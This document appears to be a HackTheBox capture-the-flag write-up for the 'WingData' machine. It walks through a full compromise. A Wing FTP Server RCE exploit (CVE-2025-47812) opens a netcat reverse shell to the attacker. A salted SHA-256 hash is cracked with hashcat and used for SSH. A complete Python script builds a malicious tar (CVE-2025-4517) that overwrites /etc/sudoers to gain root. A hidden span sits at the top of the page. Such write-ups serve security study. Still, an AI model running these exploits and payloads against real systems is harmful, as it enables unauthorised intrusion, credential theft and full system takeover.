<span id="no-password" style="display:none;">Z3R0S_NO_PASSWORD_PLEASE</span>

﻿---
title: "HTB - WingData"
date: 2026-05-08
tags: ["HackTheBox","Linux","Easy","CVE-2025-47812","WingFTP","RCE","tarfile","CVE-2025-4517"]
categories: ["Machines&Challenges"]
difficulty: "Easy"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/WingData.png"
---
| Field | Value |
|-------|-------|
| Difficulty | Easy |
| OS | Linux |
| CVEs | CVE-2025-47812 · CVE-2025-4517 · CVE-2025-4138 |

---

## Summary

WingData is an Easy Linux machine. A company website redirects to an FTP client portal running **Wing FTP Server v7.4.3**, which is vulnerable to an unauthenticated RCE (**CVE-2025-47812**). Post-exploitation enumeration reveals a salted SHA-256 hash for user `wacky` stored in Wing FTP config files. After cracking the hash with hashcat and gaining SSH access, a misconfigured sudo rule allows execution of a Python backup restoration script as root. The script is vulnerable to **CVE-2025-4517**, a tarfile `PATH_MAX` bypass that allows arbitrary file write - used to overwrite `/etc/sudoers` and gain root.

---

## Attack Chain Overview

| # | Stage | Technique | CVE/Tool |
|---|-------|-----------|----------|
| 1 | Recon | nmap + vhost discovery | - |
| 2 | Web Enum | `ftp.wingdata.htb` - Wing FTP Server v7.4.3 | - |
| 3 | Foothold | Unauthenticated RCE via NULL-byte bypass | CVE-2025-47812 |
| 4 | Lateral Move | Crack SHA-256+salt hash → SSH as `wacky` | hashcat -m 1410 |
| 5 | Priv-Esc | tarfile PATH_MAX bypass → `/etc/sudoers` | CVE-2025-4517 |
| 6 | Root | `sudo /bin/bash` → root shell | - |

---

## 01 - Recon & Enumeration

```bash
echo '<IP_MACHINE> wingdata.htb ftp.wingdata.htb' | sudo tee -a /etc/hosts
nmap -sC -sV -T4 -p- <IP_MACHINE> --open -oN nmap.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1
80/tcp open  http    Apache httpd (redirect → wingdata.htb)
```

Clicking **Client Portal** on the main site redirects to `http://ftp.wingdata.htb/login.html?lang=english` - Wing FTP Server web interface. The page footer reveals the version.

**Version:** Wing FTP Server v7.4.3 - vulnerable to **CVE-2025-47812**

---

## 02 - Foothold: CVE-2025-47812 (Wing FTP RCE)

**Vulnerability:** Wing FTP Server <= 7.4.3 is vulnerable to an unauthenticated RCE via NULL-byte injection in the authentication flow. The server processes the `loginok.html` endpoint without properly validating user identity, allowing anonymous command injection.

### Step 1 - Start listener

```bash
nc -lvnp 9443
```

### Step 2 - Run exploit

```bash
# Download PoC: searchsploit -m 52347
python3 52347.py -u http://ftp.wingdata.htb \
  -c 'busybox nc <IP_KALI> 9443 -e sh' -v
```

### Step 3 - Stabilise shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

wingftp@wingdata:/opt/wftpserver$ id
uid=1002(wingftp) gid=1002(wingftp) groups=1002(wingftp)
```

---

## 03 - Lateral Move: Hash Crack → SSH as wacky

### Enumerate Wing FTP config files

```bash
find . -name '*.xml' 2>/dev/null
# <password>32940...</password>
# <salt>WingFTP</salt>
```

### Crack with hashcat (mode 1410 = sha256($pass.$salt))

```bash
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt --show
# 32940<hash>:WingFTP:<cracked_password>

ssh wacky@<IP_MACHINE>
wacky@wingdata:~$ cat user.txt
```

---

## 04 - Privilege Escalation: CVE-2025-4517 tarfile bypass

### Step 1 - Enumerate sudo

```bash
sudo -l
# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
# Script uses: tar.extractall(path=staging_dir, filter='data')
```

`filter='data'` was intended to prevent TarSlip - but **CVE-2025-4517 bypasses it**.

### CVE-2025-4517 - Python tarfile PATH_MAX bypass

By constructing a chain of symlinks and directory names that exceed the system `PATH_MAX` (4096 bytes), `realpath()` normalization fails - allowing file writes outside the intended staging directory. Since the script runs as root via sudo, this yields **arbitrary root file write**.

### Step 2 - Build the malicious tar

```python
# exploit.py - creates backup_9999.tar with hardlink → /etc/sudoers
import tarfile, os, io

comp = 'd' * 247
steps = 'abcdefghijklmnop'  # 16 levels - exceeds PATH_MAX
path = ''
with tarfile.open('/tmp/backup_9999.tar', 'w') as tar:
    for ch in steps:
        d = tarfile.TarInfo(os.path.join(path, comp))
        d.type = tarfile.DIRTYPE; tar.addfile(d)
        s = tarfile.TarInfo(os.path.join(path, ch))
        s.type = tarfile.SYMTYPE; s.linkname = comp; tar.addfile(s)
        path = os.path.join(path, comp)
    pivot = tarfile.TarInfo('/'.join(steps) + '/' + 'l'*254)
    pivot.type = tarfile.SYMTYPE
    pivot.linkname = '../' * len(steps); tar.addfile(pivot)
    e = tarfile.TarInfo('escape')
    e.type = tarfile.SYMTYPE
    e.linkname = '/'.join(steps)+'/'+'l'*254+'/../../../../../../../etc'
    tar.addfile(e)
    f = tarfile.TarInfo('sudoers_link')
    f.type = tarfile.LNKTYPE; f.linkname = 'escape/sudoers'; tar.addfile(f)
    content = b'wacky ALL=(ALL) NOPASSWD: ALL\n'
    c = tarfile.TarInfo('sudoers_link')
    c.size = len(content); tar.addfile(c, io.BytesIO(content))

python3 /tmp/make_tar.py
```

> **Alternative:** Use the published PoC at `github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData`

### Step 3 - Deploy and trigger

```bash
cp /tmp/backup_9999.tar /opt/backup_clients/backups/

sudo /usr/local/bin/python3 \
  /opt/backup_clients/restore_backup_clients.py \
  -b backup_9999.tar -r restore_pwn_9999

# [+] SUCCESS! wacky ALL=(ALL) NOPASSWD: ALL → written to /etc/sudoers
```

### Step 4 - Root shell

```bash
sudo /bin/bash
root@wingdata:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@wingdata:/tmp# cat /root/root.txt
```

---

## CVEs Referenced

| CVE ID | Component | Type | Description |
|--------|-----------|------|-------------|
| CVE-2025-47812 | Wing FTP Server <= 7.4.3 | RCE | NULL-byte auth bypass → unauthenticated code execution |
| CVE-2025-4517 | Python tarfile module | LFI/Write | PATH_MAX overflow bypasses `filter='data'` |
| CVE-2025-4138 | Python tarfile module | LFI/Write | Related tarfile path traversal bypass |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| 52347.py (CVE-2025-47812) | Wing FTP Server unauthenticated RCE PoC |
| netcat / busybox | Reverse shell listener and payload delivery |
| hashcat -m 1410 | SHA-256 + salt hash cracking |
| CVE-2025-4517 PoC | `github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData` |
| Python tarfile | Manual malicious tar construction for PATH_MAX bypass |
